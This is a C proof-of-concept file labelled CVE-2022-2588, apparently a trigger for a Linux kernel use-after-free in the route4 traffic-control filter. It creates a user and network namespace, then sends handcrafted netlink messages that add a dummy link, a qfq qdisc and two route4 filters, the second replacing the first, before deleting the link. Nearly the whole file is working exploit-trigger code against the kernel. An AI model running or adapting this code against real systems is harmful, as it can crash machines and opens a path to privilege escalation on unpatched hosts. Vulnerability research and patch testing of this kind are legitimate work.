#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <string.h>
#include <linux/pkt_sched.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>

/* CVE-2022-2588 */

static char newlink[] = {
        /* len */
        56, 0x00, 0x00, 0x00,
        /* type = NEWLINK */
        16, 0x00,
        /* flags = NLM_F_REQUEST | NLM_F_CREATE */
        0x01, 0x04,
        /* seq */
        0x01, 0x00, 0x00, 0x00,
        /* pid */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_family */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_ifindex */
        0x30, 0x00, 0x00, 0x00,
        /* ifi_flags */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_change */
        0x00, 0x00, 0x00, 0x00,
        /* nla_len, nla_type */
        0x08, 0x00, 0x03, 0x00,
        /* string */
        'e', 't', '2', 0,
        /* nla_len, nla_type */
        16, 0x00, 18, 0x00,
        /* nested nla_len, nla_type */
        10, 0x00, 0x01, 0x00,
        'd', 'u', 'm', 'm',
        'y', 0x00, 0x00, 0x00,
};

static char dellink[] = {
        /* len */
        40, 0x00, 0x00, 0x00,
        /* type = DELLINK */
        17, 0x00,
        /* flags = NLM_F_REQUEST | NLM_F_CREATE */
        0x01, 0x04,
        /* seq */
        0x01, 0x00, 0x00, 0x00,
        /* pid */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_family */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_ifindex */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_flags */
        0x00, 0x00, 0x00, 0x00,
        /* ifi_change */
        0x00, 0x00, 0x00, 0x00,
        /* nla_len, nla_type */
        0x08, 0x00, 0x03, 0x00,
        /* string */
        'e', 't', '2', 0,
};

static char tfilter[] = {
        /* len */
        68, 0x00, 0x00, 0x00,
        /* type = NEWTFILTER */
        44, 0x00,
        /* flags = NLM_F_REQUEST | NLM_F_CREATE */
        0x41, 0x04,
        /* seq */
        0x01, 0x00, 0x00, 0x00,
        /* pid */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_family */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_ifindex */
        0x30, 0x00, 0x00, 0x00,
        /* tcm_handle */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_parent */
        0x00, 0x00, 0x01, 0x00,
        /* tcm_info = protocol/prio */
        0x01, 0x00, 0x01, 0x00,
        /* nla_len, nla_type */
        0x0a, 0x00, 0x01, 0x00,
        /* string */
        'r', 'o', 'u', 't',
        'e', 0, 0, 0,
        /* OPTIONS */
        0x14, 0x00, 0x02, 0x00,
        /* ROUTE4_TO */
        0x08, 0x00, 0x02, 0x00,
        0x00, 0x00, 0x00, 0x00,
        /* ROUTE4_FROM */
        0x08, 0x00, 0x03, 0x00,
        0x00, 0x00, 0x00, 0x00,
};

static char ntfilter[] = {
        /* len */
        56, 0x00, 0x00, 0x00,
        /* type = NEWTFILTER */
        44, 0x00,
        /* flags = NLM_F_REQUEST | NLM_F_CREATE */
        /* 0x200 = NLM_F_EXCL */
        0x41, 0x04,
        /* seq */
        0x01, 0x00, 0x00, 0x00,
        /* pid */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_family */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_ifindex */
        0x30, 0x00, 0x00, 0x00,
        /* tcm_handle */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_parent */
        0x00, 0x00, 0x01, 0x00,
        /* tcm_info = protocol/prio */
        0x01, 0x00, 0x01, 0x00,
        /* OPTIONS */
        0x14, 0x00, 0x02, 0x00,
        /* ROUTE4_TO */
        0x08, 0x00, 0x02, 0x00,
        0x01, 0x00, 0x00, 0x00,
        /* ROUTE4_FROM */
        0x08, 0x00, 0x03, 0x00,
        0x00, 0x00, 0x00, 0x00,
};


static char linkcmd[] = {
        /* len */
        44, 0x00, 0x00, 0x00,
        /* type = NEWQDISC */
        36, 0x00,
        /* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */
        0x01, 0x05,
        /* seq */
        0x01, 0x00, 0x00, 0x00,
        /* pid */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_family */
        0x00, 0x00, 0x00, 0x00,
        /* tcm_ifindex */
        0x30, 0x00, 0x00, 0x00,
        /* tcm_handle */
        0x00, 0x00, 0x01, 0x00,
        /* tcm_parent */
        0xff, 0xff, 0xff, 0xff,
        /* tcm_info = protocol/prio */
        0x00, 0x00, 0x00, 0x00,
        /* nla_len, nla_type */
        0x04, 0x00, 0x01, 0x00,
        /* string */
};

int build_qfq(char *buf)
{
        char *qopt;
        short *tlen;
        char *qdisc = "qfq";

        short *optlen;
        short *opttype;

        tlen = buf;

        memset(buf, 0, sizeof(buf));
        memcpy(buf, linkcmd, sizeof(linkcmd));
        strcpy(buf+sizeof(linkcmd), qdisc);
        *tlen = sizeof(linkcmd) + strlen(qdisc) + 1;
        buf[36] = strlen(qdisc)+5;

        qopt = buf + *tlen;
        /* nla_len, nla_type */
        /* 24, 0x00, 0x02, 0x00, */
        optlen = qopt;
        opttype = optlen + 1;
        *opttype = 0x2;

        *optlen = 4;

        *tlen += *optlen;

        return *tlen;
}

int main(int argc, char **argv)
{
        int s;
        pid_t p;
        int *error;
        char buf[4096];
        int tlen;
        error = (int *) (buf + 16);

        unsigned long count = 1;
        int i;

        unshare(CLONE_NEWUSER|CLONE_NEWNET);
        tlen = build_qfq(buf);

        s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);
        write(s, newlink, sizeof(newlink));
        read(s, buf, sizeof(buf));
        printf("%d\n", *error);

        write(s, buf, tlen);
        read(s, buf, sizeof(buf));
        printf("%d\n", *error);

        write(s, tfilter, sizeof(tfilter));
        read(s, buf, sizeof(buf));
        printf("%d\n", *error);

        write(s, ntfilter, sizeof(ntfilter));
        read(s, buf, sizeof(buf));
        printf("%d\n", *error);

        write(s, dellink, sizeof(dellink));
        read(s, buf, sizeof(buf));
        printf("%d\n", *error);


        return 0;
}
